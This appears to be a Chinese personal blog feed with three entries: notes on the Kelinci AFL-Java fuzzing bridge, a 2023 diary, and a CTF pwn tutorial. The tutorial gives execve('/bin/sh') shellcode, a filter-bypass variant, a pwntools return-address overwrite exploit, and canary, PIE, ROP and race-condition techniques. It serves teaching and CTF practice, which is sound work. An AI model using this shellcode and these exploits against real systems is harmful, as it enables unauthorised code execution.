class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">// if this is not the first try, sleep for 0.1 seconds first</span><br>    <span class="hljs-keyword">if</span>(try &gt; <span class="hljs-number">0</span>)<br>      usleep(<span class="hljs-number">100000</span>);<br><br>    setup_tcp_connection(server, port);<br><br>    <span class="hljs-comment">/* Send mode */</span><br>    write(tcp_socket, &amp;mode, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* LOCAL MODE */</span><br>    <span class="hljs-keyword">if</span> (mode == LOCAL_MODE) &#123;<br><br>      <span class="hljs-comment">// get absolute path</span><br>      <span class="hljs-type">char</span> path[<span class="hljs-number">10000</span>];<br>      realpath(filename, path);<br><br>      <span class="hljs-comment">// send path length</span><br>      <span class="hljs-type">int</span> pathlen = <span class="hljs-built_in">strlen</span>(path);<br>      <span class="hljs-keyword">if</span> (write(tcp_socket, &amp;pathlen, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        DIE(<span class="hljs-string">&quot;Error sending path length&quot;</span>);<br>      &#125;<br>      LOG(<span class="hljs-string">&quot;Sent path length: %d\n&quot;</span>, pathlen);<br><br>      <span class="hljs-comment">// send path</span><br>      <span class="hljs-keyword">if</span> (write(tcp_socket, path, pathlen) != pathlen) &#123;<br>        DIE(<span class="hljs-string">&quot;Error sending path&quot;</span>);<br>      &#125;<br>      LOG(<span class="hljs-string">&quot;Sent path: %s\n&quot;</span>, path);<br>      <br>      nread = read(tcp_socket, &amp;kelinci_status, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (nread != <span class="hljs-number">1</span>) &#123;<br>      LOG(<span class="hljs-string">&quot;Failure reading exit status over socket.\n&quot;</span>);<br>      kelinci_status = STATUS_COMM_ERROR;<br>      <span class="hljs-keyword">goto</span> cont;<br>    &#125;<br>    LOG(<span class="hljs-string">&quot;Return kelinci_status = %d\n&quot;</span>, status);<br>  <br>    <span class="hljs-comment">/* Read &quot;shared memory&quot; over TCP */</span><br>    <span class="hljs-type">uint8_t</span> *shared_mem = <span class="hljs-built_in">malloc</span>(SHM_SIZE);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> offset = <span class="hljs-number">0</span>; offset &lt; SHM_SIZE; offset += SOCKET_READ_CHUNK) &#123;<br>      nread = read(tcp_socket, shared_mem+offset, SOCKET_READ_CHUNK);<br>      <span class="hljs-keyword">if</span> (nread != SOCKET_READ_CHUNK) &#123;<br>LOG(<span class="hljs-string">&quot;Error reading from socket\n&quot;</span>);<br>kelinci_status = STATUS_COMM_ERROR;<br>...<br>  <span class="hljs-comment">/* If successful, copy over to actual shared memory */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SHM_SIZE; i++) &#123;<br>      <span class="hljs-keyword">if</span> (shared_mem[i] != <span class="hljs-number">0</span>) &#123;<br>        LOG(<span class="hljs-string">&quot;%d -&gt; %d\n&quot;</span>, i, shared_mem[i]);<br>        trace_bits[i] += shared_mem[i];<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="3-21补充"><a href="#3-21补充" class="headerlink" title="3.21补充"></a>3.21补充</h5><p>实际上手发现了不一样的地方，一般进行AFL模糊测试时，会用afl-gcc对目标程序进行编译插桩，而kelinci并没有。</p><p>而是用afl-fuzz直接运行，因为在interface.c中，作者利用了afl本身的管道通信和forkserver的机制。</p><p>具体的细节如下面两张图所示</p><p><a href="https://www.imagehub.cc/image/17pdpj"><img src="https://s1.imagehub.cc/images/2024/03/21/cd3a9f96112118f9c9ebebe88ae5bac2.png" alt="cd3a9f96112118f9c9ebebe88ae5bac2.png"></a></p><p><a href="https://www.imagehub.cc/image/17prbg"><img src="https://s1.imagehub.cc/images/2024/03/21/dc96f0165c42a7fc1631b82e25e18391.png" alt="dc96f0165c42a7fc1631b82e25e18391.png"></a></p><p>而在interface.c中，作者没有对interface进行插桩，但根据代码可以理解为作者手动进行了插桩，利用了AFL的forkserver机制。</p><p>首先开启forkserver机制，通过向<code>FORKSRV_FD+1</code>即199这个文件描述符，向状态管道中写入4个字节的值，用来告知afl fuzz，fork server成功启动，等待下一步指示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">LOG(<span class="hljs-string">&quot;Starting fork server...\n&quot;</span>);<br><span class="hljs-keyword">if</span> (write(<span class="hljs-number">199</span>, &amp;status, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>  LOG(<span class="hljs-string">&quot;Write failed\n&quot;</span>);<br>  <span class="hljs-keyword">goto</span> resume;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入<code>__afl_fork_wait_loop</code>循环，从<code>FORKSRV</code>即198中读取字节到<code>_afl_temp</code>，直到读取到4个字节，这代表afl fuzz命令我们新建进程执行一次测试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(read(<span class="hljs-number">198</span>, &amp;status, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>   DIE(<span class="hljs-string">&quot;Read failed\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>fork出子进程，原来的父进程充当fork server来和fuzz进行通信，而子进程则继续执行target。父进程即fork server将子进程的pid写入到状态管道，告知fuzz。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">LOGIFVERBOSE(<span class="hljs-string">&quot;Child PID: %d\n&quot;</span>, child_pid);<br>      write(<span class="hljs-number">199</span>, &amp;child_pid, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>然后父进程即fork server等待子进程结束，并保存其执行结果到<code>_afl_temp</code>中，然后将子进程的执行结果，从<code>_afl_temp</code>写入到状态管道，告知fuzz。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(waitpid(child_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>       DIE(<span class="hljs-string">&quot;Fork crash&quot;</span>);<br>     &#125;<br><br>     LOGIFVERBOSE(<span class="hljs-string">&quot;Status %d \n&quot;</span>, status);<br>     write(<span class="hljs-number">199</span>, &amp;status, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>父进程不断轮询<code>__afl_fork_wait_loop</code>循环，不断从控制管道读取，直到fuzz端命令fork server进行新一轮测试。</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>作者在项目里给了运行实例。</p><p>首先要编译目标程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">javac src/*.java -d bin<br></code></pre></td></tr></table></figure><p>然后对目标程序进行插桩，这里由于java反射安全等原因，只能用jdk8，才能成功运行并进行插桩。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp ../../instrumentor/build/libs/kelinci.jar edu.cmu.sv.kelinci.instrumentor.Instrumentor -i bin -o bin-instrumented<br></code></pre></td></tr></table></figure><p>然后可以开始启动kelinci的server端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp bin-instrumented edu.cmu.sv.kelinci.Kelinci SimpleBuggy @@<br></code></pre></td></tr></table></figure><p>再启动AFL端即可对目标java程序进行fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i in_dir -o out_dir ../../fuzzerside/interface @@<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023碎碎念</title>
    <link href="/2024/01/01/2023%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <url>/2024/01/01/2023%E7%A2%8E%E7%A2%8E%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h3 id="2023碎碎念"><a href="#2023碎碎念" class="headerlink" title="2023碎碎念"></a>2023碎碎念</h3><h4 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h4><p>1月算又好又坏的一月吧，发生了不愉快的事，但是也发生了很开心的事，第一次线下办公。疫情解封后与高中同学们班主任的重聚。找回了很久以前的感觉，听到了很多从未听过的故事，也算增长了许多的见识吧。</p><h4 id="2月-3月"><a href="#2月-3月" class="headerlink" title="2月-3月"></a>2月-3月</h4><p>在线下实习，体验互联网公司的生活，和当时在北京的一些小伙伴们庆祝元宵节，北京街上的人很多。和lmd,lrj一起游览北京大学，感受北大的生活。 月末和悦宇哥吃法，和公司去慕田峪长城团建，和组里员工最后一次团建，还不小心把嘴烫到了。</p><h4 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h4><p>辞职，告别美团，回到学校，再次见到小伙伴们，游览了大财，爬了大黑山，一起去了发现王国。可能是除了六月以外最精彩的一个月了</p><h4 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h4><p>通宵去旅顺拍荧光海，在滨海大道拍日出。赶毕设</p><h4 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h4><p>第一次参加大工嘉年华，参加毕设答辩。一起爬莲花山，参加学校举办的毕业聚餐，和好朋友们一起拍毕业照，最后参加毕业典礼。月末和小伙伴们去了云南，去了丽江古城，爬了玉龙雪山，看了蓝月谷，吃了云南美食。去了大理，环洱海自驾，阳光确实很晒，去腾冲泡了温泉。向晚背包挂件被永远留在了云南</p><h4 id="7月-8月"><a href="#7月-8月" class="headerlink" title="7月-8月"></a>7月-8月</h4><p>在家里打游戏。</p><h4 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h4><p>开学，前往国科，熟悉新环境，上课学习参加社团感受国科大的日与夜。入坑了骑行，唯一壮举：骑行20km去吃麦当劳。</p><h4 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h4><p>和小伙伴们在国庆去了南京，第一次去南方，不错的回忆。见到了Thomas老师，用zyc寄来的胶卷相机尝试了第一次胶卷拍摄。留住了秋末的痕迹</p><h4 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h4><p>月初去了趟天津，见了见毕业的朋友们和学弟学妹。去了雁栖湖，红螺寺玩。爬山送水，也算干了一件有意义的事。</p><h4 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h4><p>北京大雪，感觉12月有一般的时间都是在雪中度过的。一起打游戏的小伙伴找到了女朋友，游戏变得很少打了。总感觉失去了什么。伴随着有些玉玉迎来了新的一年。</p><p>希望新的一年越来越好吧。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn栈溢出基本知识</title>
    <link href="/2023/12/10/pwn/"/>
    <url>/2023/12/10/pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode通常使用机器语言编写，是一段用于利用软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行shell而得名。</p><p>在编程语言中要想获得系统执行权限，经常使用**execve(‘&#x2F;bin&#x2F;sh&#x2F;‘,0,0)**。</p><p>只需要将<strong>execve</strong>的系统调用号放入rax寄存器然后将**’&#x2F;bin&#x2F;sh’**的字符串放入第一个参数，再将第二第三个参数置为0 加上syscall就可以getshell。</p><p>64位程序中，使用寄存器传参，前6个参数按照寄存器rdi,rsi,rdx,rcx,r8,r9。如果参数超过6个则被压入栈中。</p><p>因此要做的就是将rax 置0，rdi放入’&#x2F;bin&#x2F;sh&#x2F;‘ ，rsi,rdx均置0</p><p>下面的代码便为相对应的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor rax,rax // 清空rax寄存器<br>push 0x3b// 将execve 系统调用号59压入栈 <br>pop rax     //将栈顶59弹出给rax<br>xor rdi,rdi //将rdi寄存器清空<br>mov rdi ,0x68732f6e69622f //将&#x27;/bin/sh&#x27;放入rdi 小端字节序，先读低位字节，因此要将/bin/sh反过来<br>xor rsi,rsi  //清空rsi<br>xor rdx,rdx //rdx<br>syscall<br></code></pre></td></tr></table></figure><p>有时题目会加入一些限制，如禁用掉一些特殊的字节，需要在其中加入其他的汇编指令进行绕过，有一些需要通过nop sled命令，有一些用特别的加法。如下面汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor rax,rax<br>push rax<br>mov rdi,0x0068732f6e69622f<br>push rdi<br>mov rdi,rsp<br>mov rsi,0x000000000000702d<br>push rsi<br>mov rbx,rsp<br>push 0x0<br>push rbx<br>push rdi<br>mov rsi,rsp<br>xor rdx,rdx<br>mov rax,59<br>inc byte ptr [rip]<br>.word 0x050e<br></code></pre></td></tr></table></figure><p>通过inc指令绕过了对syscall字节的禁用。</p><p>当然shellcode不止execve这一种形式，还可以ORW，通过ROP的方式调用open, read，write来打印flag内容。</p><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>&#x2F;bin&#x2F;sh理解：指该脚本用&#x2F;bin&#x2F;sh来执行。</p><p>当没有加#!+shell解释器时，脚本会默认当前用户登录的shell为脚本解释器，通常为bash。</p><p>在终端下要执行一个可执行文件，直接输入它的文件名+路径。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./a #为了承接现在的文件夹，合并完整路径进行执行。<br></code></pre></td></tr></table></figure><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>编写程序时没有考虑到控制或者错误控制用户输入的长度，本质是向定长缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><h4 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h4><p>函数调用栈是指程序运行时内存一段连续的区域。</p><p>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应内存地址在压栈时变小，退栈时变大。</p><p>寄存器esp存储函数调用栈的栈顶地址，ebp存储函数状态的基地址，eip存储即将执行的程序指令地址。</p><p>栈溢出的基本情况：</p><p><img src="C:\Users\Jty\AppData\Roaming\Typora\typora-user-images\image-20230804233642405.png" alt="image-20230804233642405"></p><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a><a href="https://adworld.xctf.org.cn/challenges/list">例题</a>：</h4><p>pwnstack</p><p>下载后得到文件pwn2.</p><p>放进IDA中看到main函数源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  initsetbuf();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is pwn1,can you do that??&quot;</span>);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看vuln()函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C">_int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">160</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-A0h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(v1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v1));<br>  read(<span class="hljs-number">0LL</span>, (__int64)v1, <span class="hljs-number">177LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>v1仅有160字节，但read函数读入177字节存在缓存区溢出。</p><p>查看vuln()函数的栈空间：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-number">-00000000000000</span>A0 var_A0          db ?<br><span class="hljs-number">-000000000000009</span>F                 db ? ; undefined<br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-number">-0000000000000001</span>                 db ? ; undefined<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> dup(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> dup(?)<br></code></pre></td></tr></table></figure><p>函数返回地址在0x8 变量开始地址在0xA0。</p><p>所以可以构造0xA8大小的输入在拼接上后门函数的返回地址即可。</p><p>IDA中可以查看到后门函数的地址，因此可以写出exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;ip&quot;</span>,端口)<br>backdoor = <span class="hljs-number">0x400762</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xA8</span> + p64(backdoor)<span class="hljs-comment">#p32、p64所做的是，将一个整形数据进行hex转换后，将这个进行转换成byte型，并进行小段输入</span><br>p.recvuntil(<span class="hljs-string">&quot;this is pwn1,can you do that??\n&quot;</span>)<br>p.send(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>最后得到flag</p><h4 id="canary保护的栈溢出"><a href="#canary保护的栈溢出" class="headerlink" title="canary保护的栈溢出"></a>canary保护的栈溢出</h4><p>原理：在函数入口处，先从fs&#x2F;gs寄存器中取出4字节（eax）或者8字节（rax）的值存到栈上，当函数结束时会检查栈上的值是否和存进的值一致。</p><p>canary绕过主要分为以下几种。</p><p>1.根据字符串特性泄露canary从而绕过。</p><p>2.Canary爆破（针对有fork函数的程序）</p><p>3 Stack smashing 故意触发canary_ssp leak</p><p>4.劫持 __stack_chk_fail</p><h4 id="PIE保护的栈溢出"><a href="#PIE保护的栈溢出" class="headerlink" title="PIE保护的栈溢出"></a>PIE保护的栈溢出</h4><p>PIE是针对代码段.text数据段.data未初始化全局变量段.bss等固定地址的一个防护技术，开启PIE保护后，每次加载程序都会变换加载地址。</p><p>绕过PIE保护的核心思想就是partial writing（部分写地址），PIE保护的程序所有的代码段地址只有最后三个数是已知的，而程序基地址的最后三个数字一定为0，所以已知地址的最后三个数就是实际的地址三个数</p><p>因此可以据此进行爆破，枚举后两个字节全部的可能值，15-16次可能猜中正确的PIE。</p><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><h4 id="Race-condition"><a href="#Race-condition" class="headerlink" title="Race condition"></a>Race condition</h4><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。</p><p>由于目前的系统中大量采用并发编程，经常对资源进行共享，往往会产生条件竞争漏洞。</p><p>这里我们主要考虑计算机程序方面的条件竞争。当一个软件的运行结果依赖于进程或者线程的顺序时，就可能会出现条件竞争。简单考虑一下，可以知道条件竞争需要如下的<strong>条件</strong>：</p><ul><li>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。</li><li>共享对象，即多个并发流会访问同一对象。<strong>常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。</strong>此外，我们称访问共享对象的代码为<strong>临界区</strong>。在正常写代码时，这部分应该加锁。</li><li>改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li></ul><p>由于在并发时，执行流的不确定性很大，条件竞争相对<strong>难察觉</strong>，并且在<strong>复现和调试方面会比较困难</strong>。这给修复条件竞争也带来了不小的困难。</p><p>条件竞争造成的影响也是多样的，轻则程序异常执行，重则程序崩溃。如果条件竞争漏洞被攻击者利用的话，很有可能会使得攻击者获得相应系统的特权。</p><p>例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">showflag</span><span class="hljs-params">()</span> &#123; system(<span class="hljs-string">&quot;cat flag&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *buf)</span> &#123;<br>  <span class="hljs-type">int</span> number;<br>  <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> fd = open(file, O_RDONLY);<br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>    perror(<span class="hljs-string">&quot;open file failed!!&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    number = read(fd, buf + index, <span class="hljs-number">128</span>);<br>    <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    index += number;<br>  &#125;<br>  buf[index + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">char</span> *file)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">tmp</span>;</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(file, <span class="hljs-string">&quot;flag&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file can not be flag!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  stat(file, &amp;tmp);<br>  <span class="hljs-keyword">if</span> (tmp.st_size &gt; <span class="hljs-number">255</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file size is too large!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[argc])</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br>    check(argv[<span class="hljs-number">1</span>]);<br>    vuln(argv[<span class="hljs-number">1</span>], buf);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Usage ./prog &lt;filename&gt;&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看出程序的基本流程如下</p><ul><li>检查传入的命令行参数是不是 “flag”，如果是的话，就退出。</li><li>检查传入的命令行参数对应的文件大小是否大于 255，是的话，就直接退出。</li><li>将命令行参数所对应的文件内容读入到 buf 中 ，buf 的大小为 256。</li></ul><p>看似我们检查了文件的大小，同时 buf 的大小也可以满足对应的最大大小，但是这里存在一个条件竞争的问题。</p><p>如果我们在程序检查完对应的文件大小后，将对应的文件删除，并符号链接到另外一个更大的文件，那么程序所读入的内容就会更多，从而就会产生栈溢出。</p><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>那么，基本思路来了，我们是想要获得对应的<code>flag</code>的内容。那么我们只要通过栈溢出修改对应的<code>main</code>函数的返回地址即可，通过反汇编以及调试可以获得<code>showflag</code>的地址，获得对应的 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  racetest cat payload.py <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>test = ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span 